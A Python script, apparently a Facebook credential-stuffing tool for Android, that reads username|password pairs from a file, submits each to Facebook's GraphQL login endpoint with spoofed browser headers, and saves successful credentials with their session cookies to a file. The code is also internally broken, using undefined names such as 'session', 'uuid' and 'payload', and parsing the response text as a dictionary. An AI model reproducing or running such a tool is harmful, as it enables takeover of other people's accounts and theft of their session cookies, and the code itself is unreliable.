import os, time, random, re, sys, requests, json

oks, cps, bkas = [], [], []
loop = 0

try:
    xvx = open('/sdcard/proxy.txt', 'r').read().splitlines()
except:
    xvx = ["http://127.0.0.1:8080"]

logo_text = "🔐 Facebook Login Tool (One ID at a time) 🔐"
linex = lambda: print('-' * 50)
check_lock = lambda cid: "live"

os.system('clear')
print(logo_text)

dfile = input('\n📄 ENTER FILE PATH (e.g., sdcard/mahadi.txt): ')
try:
    dx = open(dfile, 'r').read().splitlines()
except FileNotFoundError:
    print('❌ FILE NOT FOUND...')
    time.sleep(1)
    sys.exit()

if not dx:
    print('❌ FILE IS EMPTY...')
    time.sleep(1)
    sys.exit()

for user in dx:
    os.system('clear')
    print(logo_text)
    print("📲 TOTAL ID : 1")
    print("🔄 PROCESSING ONE ID...")
    linex()
    try:
        ids, pw = user.split('|')
        ids, pw = ids.strip(), pw.strip()
    except:
        continue
    sys.stdout.write(f"\r ⏳ (M5) ({loop}) (OK-{len(oks)}) (CP-{len(cps)})\r")
    sys.stdout.flush()
    try:
        # Step 1 – Load Facebook login page
        r = session.get("https://www.facebook.com/login.php")
        html = r.text

        # Step 2 – Extract required tokens
        def rex(pat):
           m = re.search(pat, html)
           return m.group(1) if m else ""
    
        lsd = rex(r'name="lsd" value="(.*?)"')
        jazoest = rex(r'name="jazoest" value="(.*?)"')
        __spin_r = rex(r'"__spin_r":(\d+)') or "0"
        __spin_t = rex(r'"__spin_t":(\d+)') or str(int(time.time()))
        __spin_b = rex(r'"__spin_b":"(.*?)"') or "trunk"
        __rev = rex(r'"client_revision":(\d+)') or "0"
        __hsi = rex(r'"hsi":"(.*?)"') or str(int(time.time()))
        
        # Step 3 – Generate dynamic IDs
        guid = str(uuid.uuid4()).replace("-", "")[:16]
        waterfall_id = str(uuid.uuid4())
        lgnrnd = base64.b64encode(os.urandom(6)).decode()[:12]

        # Step 4 – Build password in PWD_BROWSER format
        timestamp = str(int(time.time()))
        enc_pwd = f"#PWD_BROWSER:0:{timestamp}:{pw}"

        # Step 5 – Get current doc_id for login mutation
        # NOTE: This is scraped from the page JS. For demo, we set placeholder.
        # You must update this by fetching / scraping when Facebook changes it.
        doc_id = rex(r'"LoginMutation"\],\["(.*?)"') or "CURRENT_DOC_ID_HERE"
        variables = {
        "input": {
            "client_mutation_id": "1",
            "actor_id": "0",
            "app": "facebook",
            "auth_domain_data_key": None,
            "caa_login_request_extra_info": {
                "guid": guid,
                "jazoest": jazoest,
                "lsd": lsd,
                "lgnrnd": lgnrnd,
                "login_source": "comet_headerless_login",
                "locale": "en_GB",
                "timezone": "0"
            },
            "credential_type": "password",
            "enc_password": {
                "sensitive_string_value": enc_pwd
            },
            "event_request_id": str(uuid.uuid4()),
            "identifier": ids,
            "password": {
                "sensitive_string_value": enc_pwd
            },
            "persistent": True,
            "trusted_device_records": "{}",
            "waterfall_id": waterfall_id
        },
        "scale": 1
    }
        cookies = {
        "av": "0",
        "__user": "0",
        "__a": "1",
        "__dyn": "",
        "__csr": "",
        "__req": "1",
        "__hs": "",
        "__rev": __rev,
        "__hsi": __hsi,
        "lsd": lsd,
        "jazoest": jazoest,
        "__spin_r": __spin_r,
        "__spin_b": __spin_b,
        "__spin_t": __spin_t,
        "fb_api_caller_class": "RelayModern",
        "fb_api_req_friendly_name": "useCDSWebLoginMutation",
        "variables": json.dumps(variables),
        "server_timestamps": "true",
        "doc_id": doc_id
    }
        headers = {
        'authority': 'www.facebook.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'max-age=0',
        'content-type': 'application/x-www-form-urlencoded',
        'dpr': '1',
        'origin': 'https://www.facebook.com',
        'referer': 'https://www.facebook.com/settings/applications/app_details/?app_id=293471457383333',
        'sec-ch-prefers-color-scheme': 'dark',
        'sec-ch-ua': '"Not=A?Brand";v="99", "Chromium";v="118"',
        'sec-ch-ua-full-version-list': '"Not=A?Brand";v="99.0.0.0", "Chromium";v="118.0.5993.159"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-model': '""',
        'sec-ch-ua-platform': '"Windows"',
        'sec-ch-ua-platform-version': '"10.0.0"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
        'viewport-width': '885',}
        url = 'https://www.facebook.com/api/graphql/'
        result = session.post(url, data=payload, headers=headers).text
        print(result)
        if "session_key" in result:
            sb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
            ckkk = ";".join(i["name"]+"="+i["value"] for i in result["session_cookies"])
            coki = f"sb={sb};{ckkk}"
            print(f"\n✅ OK: {ids}|{pw}")
            open("/sdcard/ATOM-COOKIE-OK.txt", "a").write(f"{ids}|{pw}|{coki}\n")
            oks.append(ids)
        else:
            print("\n❌ FAIL: Login not successful.")
    except Exception as e:
        print(f"\n⚠️ ERROR: {e}")
        time.sleep(2)
    loop += 1
    linex()
    #print(f"🔍 Response Code: {response.status_code}")  # <-- Added response code print
    print("🔚 PROCESS COMPLETE.")
    linex()
    input("➡️ PRESS ENTER TO LOGIN NEXT ID...")
